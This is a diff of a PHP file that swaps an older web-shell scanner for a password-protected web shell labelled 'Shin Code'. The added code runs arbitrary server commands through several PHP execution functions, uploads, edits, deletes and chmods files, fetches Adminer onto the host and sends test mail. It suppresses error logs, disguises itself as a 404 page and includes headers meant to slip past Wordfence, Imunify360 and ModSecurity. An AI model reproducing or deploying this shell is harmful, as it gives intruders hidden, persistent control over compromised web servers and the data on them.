@@ -3,360 +3,790 @@ if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['s
       $_SESSION['secretyt'] = true; } else { die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>'); } } }
 ?>
 <?php
-putenv("TZ=Asia/Jakarta");
-error_reporting(0);
-?><html><head><meta name="robots" content="noindex, nofollow, noarchive"><script language="JavaScript" type="text/JavaScript">
-<!--
-function MM_openBrWindow(theURL,winName,features) { //v2.0
-window.open(theURL,winName,features)
+
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@error_reporting(0);
+@set_time_limit(0);
+@ob_clean();
+@header("X-Accel-Buffering: no");
+@header("Content-Encoding: none");
+@http_response_code(403);
+@http_response_code(404);
+@http_response_code(500);
+//Shin Code - Created 15 July 2023
+//jan di ganti ganti ntar error aoakwkwk
+//Recode aja  banh penting ga cuma ganti copyright :')
+function getFileDetails($path)
+{
+    $folders = [];
+    $files = [];
+
+    try {
+        $items = @scandir($path);
+        if (!is_array($items)) {
+            throw new Exception('Failed to scan directory');
+        }
+
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') {
+                continue;
+            }
+
+            $itemPath = $path . '/' . $item;
+            $itemDetails = [
+                'name' => $item,
+                'type' => is_dir($itemPath) ? 'Folder' : 'File',
+                'size' => is_dir($itemPath) ? '' : formatSize(filesize($itemPath)),
+                'permission' => substr(sprintf('%o', fileperms($itemPath)), -4),
+            ];
+            if (is_dir($itemPath)) {
+                $folders[] = $itemDetails;
+            } else {
+                $files[] = $itemDetails;
+            }
+        }
+
+        return array_merge($folders, $files);
+    } catch (Exception $e) {
+        return 'None';
+    }
 }
-//-->
-</script><style type="text/css">
-<!--
-body {
-font-family: Tahoma;
-color: #CCCCCC;
-background-color: #000000;
-font-size: 11px;
-font-weight: bold;
+
+function formatSize($size)
+{
+    $units = array('B', 'KB', 'MB', 'GB', 'TB');
+    $i = 0;
+    while ($size >= 1024 && $i < 4) {
+        $size /= 1024;
+        $i++;
+    }
+    return round($size, 2) . ' ' . $units[$i];
 }
-.single{
-border: 1px solid #00ff00;
-padding: 5px;
+//cmd fitur
+function executeCommand($command)
+{
+    $currentDirectory = getCurrentDirectory();
+    $command = "cd $currentDirectory && $command";
+
+    $output = '';
+    $error = '';
+
+    // proc_open
+    $descriptors = [
+        0 => ['pipe', 'r'],
+        1 => ['pipe', 'w'],
+        2 => ['pipe', 'w'],
+    ];
+
+    $process = @proc_open($command, $descriptors, $pipes);
+
+    if (is_resource($process)) {
+        fclose($pipes[0]);
+
+        $output = stream_get_contents($pipes[1]);
+        fclose($pipes[1]);
+
+        $error = stream_get_contents($pipes[2]);
+        fclose($pipes[2]);
+
+        $returnValue = proc_close($process);
+
+        $output = trim($output);
+        $error = trim($error);
+
+        if ($returnValue === 0 && !empty($output)) {
+            return $output;
+        } elseif (!empty($error)) {
+            return 'Error: ' . $error;
+        }
+    }
+
+    // shell_exec
+    $shellOutput = @shell_exec($command);
+    if ($shellOutput !== null) {
+        $output = trim($shellOutput);
+        if (!empty($output)) {
+            return $output;
+        }
+    } else {
+        $error = error_get_last();
+        if (!empty($error)) {
+            return 'Error: ' . $error['message'];
+        }
+    }
+
+    // exec
+    @exec($command, $execOutput, $execStatus);
+    if ($execStatus === 0) {
+        $output = implode(PHP_EOL, $execOutput);
+        if (!empty($output)) {
+            return $output;
+        }
+    } else {
+        return 'Error: Command execution failed.';
+    }
+
+    // passthru
+    ob_start();
+    @passthru($command, $passthruStatus);
+    $passthruOutput = ob_get_clean();
+    if ($passthruStatus === 0) {
+        $output = $passthruOutput;
+        if (!empty($output)) {
+            return $output;
+        }
+    } else {
+        return 'Error: Command execution failed.';
+    }
+
+    // system
+    ob_start();
+    @system($command, $systemStatus);
+    $systemOutput = ob_get_clean();
+    if ($systemStatus === 0) {
+        $output = $systemOutput;
+        if (!empty($output)) {
+            return $output;
+        }
+    } else {
+        return 'Error: Command execution failed.';
+    }
+
+    return 'Error: Command execution failed.';
 }
-a:visited {
-color: #33333;
-font-size: 11px;
-font-family: tahoma;
-text-decoration: none;
+function readFileContent($file)
+{
+    return file_get_contents($file);
 }
- 
-a:hover {
-color: #ccff00;
-text-decoration: none;
+
+function saveFileContent($file)
+{
+    if (isset($_POST['content'])) {
+        return file_put_contents($file, $_POST['content']) !== false;
+    }
+    return false;
 }
-.abunai {
-color: red;
-text-decoration: none;
-}
-.xxx {
-color: 00FF00;
-text-decoration: none;
-}
-a {
-color: 00FF00;
-font-size: 11px;
-font-family: tahoma;
-text-decoration: none;
-}
-td {
-border-style: solid;
-border-width: 0 0 1px 0;
-font-size:11px; font-family:Tahoma,Verdana,Arial; color:00FF00;
-}
-.me {
-font-size:11px; font-family:Tahoma,Verdana,Arial; color:00FF00;
-border: 0px;
-padding: 5px;
-}
-.isi:disabled{
-padding: 2px;
-border:1px solid #333333;
-font-family: Tahoma;
-color: #333333;
-background-color: #000000;
-font-size: 10px;
-font-weight: bold;
-}
-.isi{
-padding: 2px;
-border:1px solid #666666;
-font-family: Tahoma;
-color: 00FF00;
-background-color: #666666;
-font-size: 10px;
-font-weight: bold;
-}
--->
-</style><style type="text/css">
-#patch {position:absolute; height:1; width:1px; top:0; left:0;}
-</style></head><body>
-<?php
-if(isset($_REQUEST['edit']) && $_REQUEST['edit']=='file'){
-if(isset($_POST['yes'])){
-$filename = $_GET['file'];
-echo "<br><br><br><font color=red size=3><b><center>".$filename." deleted...</b></font><br><br><br><br><br><br><br>";
-unlink($filename);
-echo "<META HTTP-EQUIV=Refresh CONTENT=\"2; URL=javascript:window.close();\">";
-}else{
-if($_POST['update']) {
-$filename = $_POST['file'];
-if(is_writable($filename)) {
-$handle = fopen($filename, "w+");
-$isi=$_POST['content'];
-fwrite($handle, stripslashes($isi));
-fclose($handle);
-$stat= "<center><strong>edited successfully<br>";
-} else {
-$stat= "<center><font color=red><strong>Error! File may not be writable.</font></center>";
+//upfile
+function uploadFile($targetDirectory)
+{
+    if (isset($_FILES['file'])) {
+        $currentDirectory = getCurrentDirectory();
+        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
+        if ($_FILES['file']['size'] === 0) {
+            return 'Open Ur Eyes Bitch !!!.';
+        } else {
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
+            return 'File uploaded successfully.';
+        } else {
+            return 'Error uploading file.';
+        }
+    }
+    return '';
 }
 }
-if($_POST['close']) {
-echo "<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=javascript:window.close();\">";
+//dir
+function changeDirectory($path)
+{
+    if ($path === '..') {
+        @chdir('..');
+    } else {
+        @chdir($path);
+    }
 }
-$filename = $_GET['file'];
-if (file_exists($filename)){
-$vuln = $_GET['bug'];
-$handle = fopen($filename, "r");
-$contents = fread($handle, filesize($filename));
+
+function getCurrentDirectory()
+{
+    return realpath(getcwd());
+}
+
+//open file juga folder
+function getLink($path, $name)
+{
+    if (is_dir($path)) {
+        return '<a href="?dir=' . urlencode($path) . '">' . $name . '</a>';
+    } elseif (is_file($path)) {
+        return '<a href="?dir=' . urlencode(dirname($path)) . '&amp;read=' . urlencode($path) . '">' . $name . '</a>';
+
+    }
+}
+function getDirectoryArray($path)
+{
+    $directories = explode('/', $path);
+    $directoryArray = [];
+    $currentPath = '';
+    foreach ($directories as $directory) {
+        if (!empty($directory)) {
+            $currentPath .= '/' . $directory;
+            $directoryArray[] = [
+                'path' => $currentPath,
+                'name' => $directory,
+            ];
+        }
+    }
+    return $directoryArray;
+}
+
+
+function showBreadcrumb($path)
+{
+    $path = str_replace('\\', '/', $path);
+    $paths = explode('/', $path);
+    ?>
+    <div class="breadcrumb">
+        <?php foreach ($paths as $id => $pat) { ?>
+            <?php if ($pat == '' && $id == 0) { ?>
+             DIR : <a href="?dir=/">/</a>
+            <?php } ?>
+            <?php if ($pat == '') {
+                continue;
+            } ?>
+            <?php $linkPath = implode('/', array_slice($paths, 0, $id + 1)); ?>
+            <a href="?dir=<?php echo urlencode($linkPath); ?>"><?php echo $pat; ?></a>/
+        <?php } ?>
+    </div>
+    <?php
+}
+
+
+//tabel biar keren
+function showFileTable($path)
+{
+    $fileDetails = getFileDetails($path);
+    ?>
+    <table>
+        <tr>
+            <th>Name</th>
+            <th>Type</th>
+            <th>Size</th>
+            <th>Permission</th>
+            <th>Actions</th>
+        </tr>
+        <?php if (is_array($fileDetails)) { ?>
+            <?php foreach ($fileDetails as $fileDetail) { ?>
+                <tr>
+                    <td><?php echo getLink($path . '/' . $fileDetail['name'], $fileDetail['name']); ?></td>
+                    
+                    <td><?php echo $fileDetail['type']; ?></td>
+                    <td><?php echo $fileDetail['size']; ?></td>
+                    <td>
+                        <?php
+                        $permissionColor = is_writable($path . '/' . $fileDetail['name']) ? 'green' : 'red';
+                        ?>
+                        <span style="color: <?php echo $permissionColor; ?>"><?php echo $fileDetail['permission']; ?></span>
+                        </td>
+                    <td>
+                            
+                        <?php if ($fileDetail['type'] === 'File') { ?>
+                            <div class="dropdown">
+                                <button class="dropbtn">Actions</button>
+                                <div class="dropdown-content">
+                                    <a href="?dir=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Edit</a>
+                                    <a href="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</a>
+                                    <a href="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</a>
+                                    <a href="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</a>
+                                 </div>
+                               </div>
+                        <?php } ?>
+                        <?php if ($fileDetail['type'] === 'Folder') { ?>
+                            <div class="dropdown">
+                                <button class="dropbtn">Actions</button>
+                                <div class="dropdown-content">
+                                    <a href="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</a>
+                                    <a href="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</a>
+                                    <a href="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</a>
+                                </div>
+                             </div>
+                        <?php } ?>
+                    </td>
+                </tr>
+            <?php } ?>
+        <?php } else { ?>
+            <tr>
+                <td colspan="5">None</td>
+            </tr>
+        <?php } ?>
+    </table>
+    <?php
+}
+//chmod
+function changePermission($path)
+{
+    if (!file_exists($path)) {
+        return 'File or directory does not exist.';
+    }
+
+    $permission = isset($_POST['permission']) ? $_POST['permission'] : '';
+    
+    if ($permission === '') {
+        return 'Invalid permission value.';
+    }
+
+    if (!is_dir($path) && !is_file($path)) {
+        return 'Cannot change permission. Only directories and files can have permissions modified.';
+    }
+
+    $parsedPermission = intval($permission, 8);
+    if ($parsedPermission === 0) {
+        return 'Invalid permission value.';
+    }
+
+    if (chmodRecursive($path, $parsedPermission)) {
+        return 'Permission changed successfully.';
+    } else {
+        return 'Error changing permission.';
+    }
+}
+
+
+function chmodRecursive($path, $permission)
+{
+    if (is_dir($path)) {
+        $items = scandir($path);
+        if ($items === false) {
+            return false;
+        }
+
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') {
+                continue;
+            }
+
+            $itemPath = $path . '/' . $item;
+
+            if (is_dir($itemPath)) {
+                if (!chmod($itemPath, $permission)) {
+                    return false;
+                }
+
+                if (!chmodRecursive($itemPath, $permission)) {
+                    return false;
+                }
+            } else {
+                if (!chmod($itemPath, $permission)) {
+                    return false;
+                }
+            }
+        }
+    } else {
+        if (!chmod($path, $permission)) {
+            return false;
+        }
+    }
+
+    return true;
+}
+
+//rename
+function renameFile($oldName, $newName)
+{
+    if (file_exists($oldName)) {
+        $directory = dirname($oldName);
+        $newPath = $directory . '/' . $newName;
+        if (rename($oldName, $newPath)) {
+            return 'File or folder renamed successfully.';
+        } else {
+            return 'Error renaming file or folder.';
+        }
+    } else {
+        return 'File or folder does not exist.';
+    }
+}
+
+//delete
+function deleteFile($file)
+{
+    if (file_exists($file)) {
+        if (unlink($file)) {
+            return 'File deleted successfully.' . $file;
+        } else {
+            return 'Error deleting file.';
+        }
+    } else {
+        return 'File does not exist.';
+    }
+}
+
+function deleteFolder($folder)
+{
+    if (is_dir($folder)) {
+        $files = glob($folder . '/*');
+        foreach ($files as $file) {
+            is_dir($file) ? deleteFolder($file) : unlink($file);
+        }
+        if (rmdir($folder)) {
+            return 'Folder deleted successfully.' . $folder;
+        } else {
+            return 'Error deleting folder.';
+        }
+    } else {
+        return 'Folder does not exist.';
+    }
+}
+//main logic directory 
+$currentDirectory = getCurrentDirectory();
+$errorMessage = '';
+$responseMessage = '';
+
+if (isset($_GET['dir'])) {
+    changeDirectory($_GET['dir']);
+    $currentDirectory = getCurrentDirectory();
+}
+//edit
+if (isset($_GET['edit'])) {
+    $file = $_GET['edit'];
+    $content = readFileContent($file);
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $saved = saveFileContent($file);
+        if ($saved) {
+            $responseMessage = 'File saved successfully.' . $file;
+        } else {
+            $errorMessage = 'Error saving file.';
+        }
+    }
+}
+
+if (isset($_GET['chmod'])) {
+    $file = $_GET['chmod'];
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $responseMessage = changePermission($file);
+    }
+}
+
+if (isset($_POST['upload'])) {
+    $responseMessage = uploadFile($currentDirectory);
+}
+
+if (isset($_POST['cmd'])) {
+    $cmdOutput = executeCommand($_POST['cmd']);
+}
+
+if (isset($_GET['rename'])) {
+    $file = $_GET['rename'];
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $newName = $_POST['new_name'];
+        if (is_file($file) || is_dir($file)) {
+            $responseMessage = renameFile($file, $newName);
+        } else {
+            $errorMessage = 'File or folder does not exist.';
+        }
+    }
+}
+
+if (isset($_GET['delete'])) {
+    $file = $_GET['delete'];
+    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+        $currentDirectory = getCurrentDirectory();
+        if (is_file($file)) {
+            $responseMessage = deleteFile($file);
+            echo "<script>alert('File dihapus');window.location='?dir=" . urlencode($currentDirectory) . "';</script>";
+            exit;
+        } elseif (is_dir($file)) {
+            $responseMessage = deleteFolder($file);
+            echo "<script>alert('Folder dihapus');window.location='?dir=" . urlencode($currentDirectory) . "';</script>";
+            exit;
+        } else {
+            $errorMessage = 'File or folder does not exist.';
+        }
+    }
+}
+//panggil adminer
+if (isset($_POST['Summon'])) {
+    $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
+    $currentPath = getCurrentDirectory();
+
+    $fileUrl = $baseUrl;
+    $fileName = 'Adminer.php';
+
+    $filePath = $currentPath . '/' . $fileName;
+
+    $fileContent = @file_get_contents($fileUrl);
+    if ($fileContent !== false) {
+        if (file_put_contents($filePath, $fileContent) !== false) {
+     
+            $responseMessage = 'File "' . $fileName . '" summoned successfully. <a href="' . $filePath . '">' . $filePath . '</a>';            
+        } else {
+            $errorMessage = 'Failed to save the summoned file.';
+        }
+    } else {
+        $errorMessage = 'Failed to fetch the file content. None File';
+    }
+}
+// katanya bypass
+if (function_exists('litespeed_request_headers')) {
+    $headers = litespeed_request_headers();
+    if (isset($headers['X-LSCACHE'])) {
+        header('X-LSCACHE: off');
+    }
+}
+
+if (defined('WORDFENCE_VERSION')) {
+    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
+    define('WORDFENCE_DISABLE_FILE_MODS', true);
+}
+
+if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
+    $imunifyHeaders = imunify360_request_headers();
+    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
+        header('X-Imunify360-Request: bypass');
+    }
+    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
+        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
+    }
+}
+
+
+if (function_exists('apache_request_headers')) {
+    $apacheHeaders = apache_request_headers();
+    if (isset($apacheHeaders['X-Mod-Security'])) {
+        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
+    }
+}
+
+if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
+        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
+    }
+}
 ?>
-<center><table>
-<tr><td align="left" class="me"><strong><?=$filename?>&nbsp;&nbsp;>> Contains :&nbsp;<?=$vuln?></strong></td></tr>
-<tr><td class="me"><form method="post" action=""><input type="hidden" name="file" value="<?=$filename?>">
-<textarea name="content" cols="80" rows="15"><?=htmlspecialchars($contents)?></textarea><br>
-</td></tr><tr><td align="center" class="me">
-<?php
-if($_POST['delete']) {
-echo "Are you sure to delete ".$filename." ?";
-?>
-<tr><td align="center" class="me">
-<input type="submit" name="yes" value="YES!">
-<input type="submit" name="no" value="NO!">
-</td></tr>
-<?php
-}else{
-echo $stat;
-?></td></tr><tr><td align="right" class="me"><input type="submit" name="close" value=" Close ">
-<input type="submit" name="delete" value=" Delete "><input type="submit" name="update" value=" Update ">
-</td></tr>
-<?php
-}
-fclose($handle);
-?>
-</table></form>
-<?php
-}else{
-echo "<br><br><br><font color=red size=3><b><center>".$filename." not exist...</b></font><br><br><br><br><br><br><br>";
-echo "<META HTTP-EQUIV=Refresh CONTENT=\"4; URL=javascript:window.close();\">";
-}
-?></center>
-<?php
-}
-}elseif(isset($_POST['Submit'])){
-$ceks = array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file','str_rot13','gzinflate','gzuncompress','Uuncompress','dechex');
-foreach($ceks as $ceker){
-if($_POST[$ceker]<>""){
-$six.=$_POST[$ceker].".";
-}
-}
-$cek = explode('.', $six);
-function ListFiles($dir) {
-if($dh = opendir($dir)) {
-$files = Array();
-$inner_files = Array();
-while($file = readdir($dh)) {
-if($file != "." && $file != ".." && $file[0] != '.') {
-if(is_dir($dir . "/" . $file)) {
-$inner_files = ListFiles($dir . "/" . $file);
-if(is_array($inner_files)) $files = array_merge($files, $inner_files);
-}else{
-array_push($files, $dir . "/" . $file);
-}
-}
-}
-closedir($dh);
-return $files;
-}
-}
-$target=$_SERVER['DOCUMENT_ROOT'];
-?><center>
-<table border="0" width="90%" cellpadding="5"><tr><td class="me" align="right" width="30"><b>No</b></td>
-<td class="me" align="center" width="105"><b>Type</b></td><td class="me" align="center"><b>File Path</b></td>
-<td class="me" align="center" width="150"><b>Final Editing</b></td><td class="me" align="right" width="80"><b>File Size</b></td></tr><br>
-<?php
-foreach (ListFiles($target) as $key=>$file){
-$nFile = substr($file, -4, 4);
-if($nFile == ".php"){
-if($file==$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF']){
-}else{
-$ops = @file_get_contents($file);
-$op=strtolower($ops);
-$arr = array('c99_buff_prepare' => 'c 9 9',
-'abcr57' => 'r 5 7');
-$sis=0;
-if($op)
-$size=filesize($file);
-$last_modified = filemtime($file);
-$last=date("M-d-Y H:i", $last_modified);
-foreach($arr as $key => $val) {
-if(@preg_match("/$key/", $op)) {
-$sis=1;
-$i++;
-?>
-<tr style ="background-color: Your background Color;" onmouseover="mover(this)" onmouseout="mout(this)">
-<td align="right"><font color="red"><blink><?=$i?></blink></font></td><td align="center"><font color="red"><blink><?=$val?></blink></font></td>
-<td align="left"><blink>
-<a href="#" class="abunai" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
-</blink></td><td align="center"><font color="red"><blink><?=$last?> GMT+9</blink></font></td>
-<td align="right"><font color="red"><blink><?=$size?> byte</blink></font></td><script language="javascript">
-var bgcolor = "transparent";
-var change_color = "#444444"
-function mover(aa) {
-aa.style.backgroundColor = change_color;
-}
-function mout(aa) {
-aa.style.backgroundColor = bgcolor;
-}
-</script>
-</tr>
-<?php
-}
-}
-if($sis<>"1"){
-if((@preg_match("/system\((.*?)\)/", $op))&&(@preg_match("/<pre>/", $op))&&(@preg_match("/empty\((.*?)\)/", $op))) {
-$sis="2";
-$i++;
-$val="hidden shell";
-?>
-<tr style ="background-color: Your background Color;" onmouseover="mover(this)" onmouseout="mout(this)">
-<td align="right"><font color="00FF00"><?=$i?></font></td><td align="center"><font color="00FF00"><?=$val?></font></td><td align="left">
-<a href="#" class="xxx" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
-</td><td align="center"><font color="00FF00"><?=$last?> GMT+9</font></td>
-<td align="right"><font color="00FF00"><?=$size?> byte</font></td>
-<script language="javascript">
-var bgcolor = "transparent";
-var change_color = "#444444"
-function mover(aa) {
-aa.style.backgroundColor = change_color;
-}
-function mout(aa) {
-aa.style.backgroundColor = bgcolor;
-}
-</script></tr>
-<?php
-}
-}
-if($sis=="0"){
-foreach($cek as $bugs) {
-if ($bugs<>""){
-if(@preg_match("/$bugs\((.*?)\)/", $op)) {
-$i++;
-?>
-<tr style ="background-color: Your background Color;" onmouseover="mover(this)" onmouseout="mout(this)">
-<td align="right"><?=$i?></td><td align="center"><?=$bugs?></td><td align="left">
-<a href="#" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$bugs?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
-</td><td align="center"><?=$last?> GMT+9</td><td align="right"><?=$size?> byte</td><script language="javascript">
-var bgcolor = "transparent";
-var change_color = "#444444"
-function mover(aa) {
-aa.style.backgroundColor = change_color;
-}
-function mout(aa) {
-aa.style.backgroundColor = bgcolor;
-}
-</script></tr>
-<?php
-}
-}
-}
-}
-if($_POST['textV']<>""){
-$text=$_POST['textV'];
-if(@preg_match("/$text/", $op)) {
-$i++;
-?>
-<tr style ="background-color: Your background Color;" onmouseover="mover(this)" onmouseout="mout(this)">
-<td align="right"><?=$i?></td><td align="center"><?=$text?></td><td align="left">
-<a href="#" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$text?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
-</td><td align="center"><?=$last?> GMT+9</td><td align="right"><?=$size?> byte</td><script language="javascript">
-var bgcolor = "transparent";
-var change_color = "#444444"
-function mover(aa) {
-aa.style.backgroundColor = change_color;
-}
-function mout(aa) {
-aa.style.backgroundColor = bgcolor;
-}
-</script></tr>
-<?php
-}
-}
-}
-}
-}
-if($i==0){
-foreach($cek as $bugs) {
-if ($bugs<>""){
-$x++;
-?>
-<tr style ="background-color: Your background Color;" onmouseover="mover(this)" onmouseout="mout(this)">
-<td align="right"><?=$x?></td><td align="center"><?=$bugs?></td><td align="center"> not exist </td>
-<td align="center"> no record </td><td align="right"> -&nbsp;&nbsp;&nbsp;&nbsp;byte </td></tr>
-<?php
-}
-}
-}
-?></table>
-<?php
-}else{
-$find = array('default','base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file','str_rot13','gzinflate','gzuncompress','Uuncompress','dechex');
-?><form id="fCheck" name="fCheck" method="post" action="" autocomplete="off">
-<center><table class="single" width="400" border="1" cellpadding="10"><tr><td class="me"><center>
-<b>Select scan type:</b><br><table class="me" width="200"><tr><td class="me">
-<script language="javascript">
-function cekKlik(){
-if (!document.fCheck.cekV.checked)
-document.fCheck.textV.disabled=true;
-else
-document.fCheck.textV.disabled=false;
-if(document.fCheck.cekV.checked){
-om = om + 1;
-}else{
-if(om > 0 ){
-om = om - 1;
-}else{
-om = om;
-}
-}
-if(om != 0){
-document.fCheck.Submit.disabled=false;
-}else{
-document.fCheck.Submit.disabled=true;
-}
-}
-</script>
-<?php
-//dari sini
-foreach($find as $bug) {
-?><script language="javascript">
-var om = 0;
-function checkValue<?=$bug?>(){
-if(document.fCheck.<?=$bug?>.checked){
-om = om + 1;
-}else{
-if(om > 0 ){
-om = om - 1;
-}else{
-om = om;
-}
-}
-if(om != 0){
-document.fCheck.Submit.disabled=false;
-}else{
-document.fCheck.Submit.disabled=true;
-}
-}
-</script>
-<input onclick="checkValue<?=$bug?>();" name="<?=$bug?>" type="checkbox" id="<?=$bug?>" value="<?=$bug?>" />&nbsp;<?=$bug?><br>
-<?php
-}
-?>
-<input name="cekV" type="checkbox" onClick="cekKlik();" id="cekV" value="cekV">
-<input class="isi" disabled="disabled" name="textV" placeholder="other keyword" onFocus="this.select()" type="text" id="textV">
-<br><br><input type="hidden" name="asal" value="abcd">
-<input disabled="disabled" type="submit" name="Submit" value="Start Scan" />
-</td></tr></table></td></tr></table></form>
-<?php
-}
-?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>404</title>
+  <link rel="stylesheet" href="https://rawcdn.githack.com/Jenderal92/Blog-Gan/63073e604b81df6337c1917990a7330d46b22ae9/ganteng.css">  
+</head>
+<body>
+    <div class="container">
+        <h1></h1>
+        <div class="menu-icon" onclick="toggleSidebar()"></div>
+        <hr>
+        <div class="button-container">
+            <form method="post" style="display: inline-block;">
+                <input type="submit" name="Summon" value="Adminer" class="summon-button">
+            </form>
+            <button type="button" onclick="window.location.href='?gas'" class="summon-button">Mail Test</button>
+        </div>
+        
+
+        <?php
+        //mailer
+        if (isset($_GET['gas'])) {
+            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                if (!empty($_POST['email'])) {
+                    $xx = rand();
+                    if (mail($_POST['email'], "Shin Mailer Test - " . $xx, "Shin Ganteng")) {
+                        echo "<b>Send a report to [" . $_POST['email'] . "] - $xx</b>";
+                    } else {
+                        echo "Failed to send the email.";
+                    }
+                } else {
+                    echo "Please provide an email address.";
+                }
+            } else {
+        ?>
+                <h2>Mail Test :</h2>
+                <form method="post">
+                    <input type="text" name="email" placeholder="Enter email" required>
+                    <input type="submit" value="Send test &raquo;">
+                </form>
+        <?php
+            }
+        }
+        ?>
+
+        <?php if (!empty($errorMessage)) { ?>
+            <p style="color: red;"><?php echo $errorMessage; ?></p>
+        <?php } ?>
+
+        <hr>
+
+        <div class="upload-cmd-container">
+            <div class="upload-form">
+                <h2>Upload:</h2>
+                <form method="post" enctype="multipart/form-data">
+                    <input type="file" name="file">
+                    <button class="button" type="submit" name="upload">Upload</button>
+                </form>
+            </div>
+
+            <div class="cmd-form">
+                <h2>Command:</h2>
+                <form method="post">
+                    <?php echo @get_current_user() . "@" . @$_SERVER['REMOTE_ADDR'] . ": ~ $"; ?><input type='text' size='30' height='10' name='cmd'>
+                    <input type="submit" class="empty-button">
+
+                </form>
+            </div>
+        </div>
+        <?php
+        if (isset($_GET['read'])) {
+            $file = $_GET['read'];
+            $content = readFileContent($file);
+            if ($content !== false) {
+                echo '<div class="command-output">';
+                echo '<pre>' . htmlspecialchars($content) . '</pre>';
+                echo '</div>';
+            } else {
+                echo 'Failed to read the file.';
+                }
+              }
+           ?>
+        <?php if (!empty($cmdOutput)) { ?>
+            <h3>Command Output:</h3>
+            <div class="command-output">
+                <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
+            </div>
+        <?php } ?>
+
+        <?php if (!empty($responseMessage)) { ?>
+            <p class="response-message" style="color: green;"><?php echo $responseMessage; ?></p>
+        <?php } ?>            
+        <?php if (isset($_GET['rename'])) { ?>
+        <div class="rename-form">
+            <h2>Rename File or Folder: <?php echo basename($file); ?></h2>
+            <form method="post">
+                <input type="text" name="new_name" placeholder="New Name" required>
+                <br>
+                <input type="submit" value="Rename" class="button">
+                <a href="?dir=<?php echo urlencode(dirname($file)); ?>" class="button">Cancel</a>
+            </form>
+        </div>
+        <?php } ?>
+        <?php if (isset($_GET['edit'])) { ?>
+            <div class="edit-file">
+                <h2>Edit File: <?php echo basename($file); ?></h2>
+                <form method="post">
+                    <textarea name="content" rows="10" cols="50"><?php echo htmlspecialchars($content); ?></textarea><br>
+                    <button class="button" type="submit">Save</button>
+                </form>
+            </div>
+        <?php } elseif (isset($_GET['chmod'])) { ?>
+            <div class="change-permission">
+                <h2>Change Permission: <?php echo basename($file); ?></h2>
+                <form method="post">
+                    <input type="hidden" name="chmod" value="<?php echo urlencode($file); ?>">
+                    <input type="text" name="permission" placeholder="Enter permission (e.g., 0770)">
+                    <button class="button" type="submit">Change</button>
+                </form>
+            </div>
+        <?php } ?>
+        <hr>
+
+        <?php
+        echo '<h2>Filemanager</h2>';
+        showBreadcrumb($currentDirectory);
+        showFileTable($currentDirectory);
+        ?>
+    </div>
+<div class="sidebar" id="sidebar">
+    <div class="sidebar-content">
+        <div class="sidebar-close">
+            <button onclick="toggleSidebar()">Close</button>
+        </div>
+        <div class="info-container">
+            <h2>Server Info</h2>
+            <?php
+            function countDomainsInServer()
+            {
+                $serverName = $_SERVER['SERVER_NAME'];
+                $ipAddresses = @gethostbynamel($serverName);
+
+                if ($ipAddresses !== false) {
+                    return count($ipAddresses);
+                } else {
+                    return 0;
+                }
+            }
+
+            $domainCount = @countDomainsInServer();
+
+            function formatBytes($bytes, $precision = 2)
+            {
+                $units = array('B', 'KB', 'MB', 'GB', 'TB');
+
+                $bytes = max($bytes, 0);
+                $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+                $pow = min($pow, count($units) - 1);
+
+                $bytes /= (1 << (10 * $pow));
+
